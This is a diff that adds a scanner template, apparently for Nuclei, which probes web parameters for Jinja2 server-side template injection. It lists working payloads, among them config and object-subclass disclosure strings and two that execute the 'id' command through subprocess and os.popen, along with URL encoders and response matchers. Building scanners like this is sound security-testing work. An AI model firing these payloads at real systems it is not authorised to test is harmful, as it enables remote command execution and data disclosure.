@@ -1,0 +1,47 @@
+# templates/ssti/ssti-jinja2.yaml
+id: ssti-jinja2
+info:
+  name: Jinja2 Server-Side Template Injection
+  author: shadowxp
+  severity: critical
+  description: Tests for Jinja2 template injection leading to RCE
+  tags:
+    - ssti
+    - jinja2
+    - python
+    - rce
+
+vulnerability_type: ssti
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{ssti_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "49"
+          - "7777777"
+          - "class 'str'"
+        part: body
+      - type: regex
+        regex:
+          - "\\[.*class.*\\]"
+        part: body
+
+payloads:
+  # Basic math test
+  - "{{7*7}}"
+  - "{{7*'7'}}"
+  # Jinja2 specific
+  - "{{config}}"
+  - "{{request}}"
+  - "{{''.__class__.__mro__[2].__subclasses__()}}"
+  # RCE attempt
+  - "{{''.__class__.__mro__[2].__subclasses__()[40]('id').communicate()[0].strip()}}"
+  - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+encoders:
+  - url
+  - double_url
+
